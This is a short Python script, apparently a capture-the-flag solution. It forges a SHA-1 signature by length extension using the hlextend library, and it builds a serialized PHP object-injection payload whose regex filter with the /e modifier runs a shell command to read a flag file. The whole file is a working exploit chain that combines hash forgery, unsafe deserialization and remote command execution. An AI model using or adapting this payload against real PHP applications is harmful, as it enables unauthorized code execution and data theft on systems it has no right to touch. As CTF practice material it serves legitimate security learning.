import hlextend
import urllib
exploit = """

O:4:"Post":3:{s:8:"\x00*\x00title";s:4:"Test";s:7:"\x00*\x00text";s:5:"stuff";s:10:"\x00*\x00filters";a:1:{i:0;O:6:"Filter":2:{s:10:"\x00*\x00pattern";s:8:"/^(.*)/e";s:7:"\x00*\x00repl";s:29:"`cat /home/daedalus/flag.txt`";}}}
"""
sha = hlextend.new('sha1')
data = sha.extend(exploit,'b:1;', 8, '2141b332222df459fd212440824a35e63d37ef69')
print 'custom_settings:  ' + urllib.quote_plus(data.replace('\\x','%'))
print 'custom_settings_hash:  ' + sha.hexdigest()
